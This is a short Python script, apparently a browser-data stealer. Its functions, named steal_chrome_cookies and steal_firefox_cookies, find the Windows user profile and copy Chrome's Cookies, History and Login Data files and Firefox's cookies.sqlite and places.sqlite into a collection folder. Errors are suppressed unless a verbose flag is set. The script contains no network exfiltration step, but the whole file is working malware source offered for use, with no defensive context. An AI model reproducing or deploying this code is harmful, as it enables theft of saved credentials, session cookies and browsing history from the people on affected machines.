import os
import shutil
import sys, argparse


def input_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--copy-path",action="store", dest="copy_path")
    parser.add_argument("-v", "--verbose", action="store_true", dest="verbose")
    return parser


def get_user_folder_name():
    folders = os.getcwd().split('\\')
    for index in range(len(folders)):
        if folders[index] == "Users":
            return str(folders[index + 1])


def create_folder(path, folder_name, verbose=False):
    path = os.path.join(path, folder_name)
    if verbose:
        print(f"Creating directory: {path}")
        try:
            os.makedirs(path)
        except Exception as e:
            print(e)
            print(f"Failed to create {path}")
    else:
        try:
            os.makedirs(path)
        except:
            pass
    return path


def copy_files(files, destination, verbose=False):
    if verbose:
        for file in files:
            print(f"Attempting to copy {file} to {destination}")
            try:
                shutil.copy2(file, destination)
            except Exception as e:
                print(e)
                print(f"Unable to copy {file} to {destination}")
            else:
                print("Copy successful!")
    else:
        for file in files:
            try:
                shutil.copy2(file, destination)
            except:
                pass


def return_dir_files(path):
    if os.path.isdir(path):
        files = os.listdir(path)
        for i in range(len(files)):
            files[i] = os.path.join(path, files[i])
        return files
    else:
        return [path]


def join_paths(path, files):
    for i in range(len(files)):
        files[i] = os.path.join(path, files[i])
    return files


def steal_chrome_cookies(user_folder, destination_folder='', verbose=False):
    cookiepath = 'C:\\Users\\' + user_folder + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
    files_to_copy = ["Cookies", "History", "Login Data"]
    files_to_copy = join_paths(cookiepath, files_to_copy)
    if destination_folder:
        copy_files(files_to_copy, destination_folder, verbose)
    else:
        return files_to_copy


def steal_firefox_cookies(user_folder, destination_folder='', verbose=False):
    cookiepath = 'C:\\Users\\' + user_folder + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'
    try:
        profiles = os.listdir(cookiepath)
    except Exception as e:
        if verbose:
            print(e)
    else:
        for folder in profiles:
            if "default" in folder:
                cookiepath += "\\" + folder
                break
        files_to_copy = ["cookies.sqlite", "places.sqlite"]
        files_to_copy = join_paths(cookiepath, files_to_copy)
        if destination_folder:
            copy_files(files_to_copy, destination_folder, verbose)
        else:
            return files_to_copy
    return


def main(argv):
    parser = input_parse()
    args = parser.parse_args(argv)
    copy_path = ''
    verbose = False
    if args.copy_path:
        copy_path = args.copy_path
    else:
        copy_path = os.getcwd()
    if args.verbose:
        verbose = True
    user_folder_name = get_user_folder_name()
    chrome_folder = create_folder(copy_path, "chrome")
    firefox_folder = create_folder(copy_path, "firefox")
    steal_chrome_cookies(user_folder_name, chrome_folder, verbose)
    steal_firefox_cookies(user_folder_name, firefox_folder, verbose)


if __name__ == "__main__":
    main(sys.argv[1:])
